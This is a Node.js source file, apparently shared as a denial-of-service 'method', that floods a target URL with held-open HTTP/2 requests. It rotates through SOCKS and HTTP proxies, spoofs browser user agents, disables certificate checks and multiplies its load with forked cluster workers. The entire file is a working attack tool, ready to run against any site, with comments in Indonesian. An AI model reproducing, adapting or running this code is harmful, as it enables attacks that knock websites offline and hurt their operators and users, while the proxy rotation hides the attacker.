//Method By STEVEN•STORE🕊🪽
const fs = require('fs');
const http2 = require('http2');
const { URL } = require('url');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const cluster = require('cluster');

if (process.argv.length < 5) {
    console.log(`Usage: node ${process.argv[1]} <target> <time> <threads>`);
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]) * 1000; // Konversi ke milidetik
const threads = parseInt(process.argv[4]);

// Membaca proxy dari file
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split(/\r?\n/).filter(Boolean);
if (proxies.length === 0) {
    console.log('Proxy list is empty!');
    process.exit(1);
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
];

function startFlood() {
    const parsedUrl = new URL(target);

    function sendHoldRequest(proxy) {
        let agent;
        if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
            agent = new SocksProxyAgent(proxy);
        } else if (proxy.startsWith('http://') || proxy.startsWith('https://')) {
            agent = new HttpsProxyAgent(proxy);
        } else {
            return;
        }

        const client = http2.connect(parsedUrl.origin, { 
            rejectUnauthorized: false,
            agent: agent
        });

        client.on('error', (err) => {
            console.error(`Client error: ${err.message}`);
        });

        const headers = {
            ':method': 'GET',
            ':path': parsedUrl.pathname,
            ':scheme': parsedUrl.protocol.replace(':', ''),
            ':authority': parsedUrl.host,
            'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'connection': 'keep-alive'
        };

        const req = client.request(headers);
        req.on('response', (headers) => {
            // Biarkan request tetap terbuka selama mungkin
            setTimeout(() => req.close(), time);
        });

        req.end();
    }

    setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        sendHoldRequest(proxy);
    }, 100);
}

// Multi-threading dengan cluster
if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('Attack finished');
        process.exit(0);
    }, time);
} else {
    startFlood();
}